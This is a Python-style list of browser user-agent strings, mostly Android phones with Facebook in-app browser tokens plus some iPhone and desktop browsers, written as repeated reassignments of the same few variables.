ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; CPH2481 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; FRL-L23 Build/HUAWEIFRL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/353.0.0.34.116;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; FRL-L23; HMSCore 6.8.0.331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/355.0.0.21.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-E225F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',] 
ua = ['FBAN/FB4A:FBAV/269.0.0.27.121;FBBV/2730509;[FBAN/FB4A;FBAV/269.0.0.27.121;FBBV/2730509;FBDM/{density=2.0,width=1080,height=1280};FBLC/en_US;FBRV/7058966804;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a;]',]
ua = ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36 OPR/76.0.4004.72670",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.1.0.14.82;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 SznProhlizec/10.1.2a",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918W Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.67 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.15 Mobile Safari/537.3",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U1 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/460.0.0.34.89;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.8 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;] [FB_IAB/FB4A;FBAV/461.0.0.47.85;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S9280 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.2 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/459.1.0.42.84;]",]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U1 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/457.0.0.54.84;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/460.0.0.34.89;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]"]
ua =["Mozilla/5.0 (Linux; U; Android 14; zh-Hans-CN; SM-S9280 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Quark/7.0.1.591 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;] FBNV/1"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/460.0.0.34.89;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/455.0.0.44.88;]"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]"]
cc =["Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.1.1; SM-J105F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 GSA/5.10.32.19.arm"]
xx =["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J111F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G935A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"]
xx =["Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 GSA/10.20.3.21.arm"]
ua =["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',]
ua = ["Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1']
ua = ['Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",]
ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36']
ua = ['Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36']
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',]
ua = ['Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',]
ua = ['Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',]
ua = ['Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',]
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1;',]
ua = ['Mozilla/5.0 (iPod; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',]
ua = ['Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',]
ua = ['Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',]
ua = ['Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19',]
ua = ['Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.803.0 Chrome/14.0.803.0 Safari/535.1',]
ua = ['Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1',]
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',]
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',]
ua = ['Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0',]
ua = ['Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0',]
ua = ['Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Android 7.0; Mobile; rv:62.0) Gecko/62.0 Firefox/62.0',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4',]
ua = ['Mozilla/5.0 (Linux; Android 7.1.2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/3.0 Chrome/59.0.3017.125 Safari/537.36',] 
ua = ['FBAN/FB4A:FBAV/269.0.0.27.121;FBBV/2730509;[FBAN/FB4A;FBAV/269.0.0.27.121;FBBV/2730509;FBDM/{density=2.0,width=1080,height=1280};FBLC/en_US;FBRV/7058966804;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a;]',]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36 OPR/76.0.4004.72670",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.1.0.14.82;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 SznProhlizec/10.1.2a",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]",]
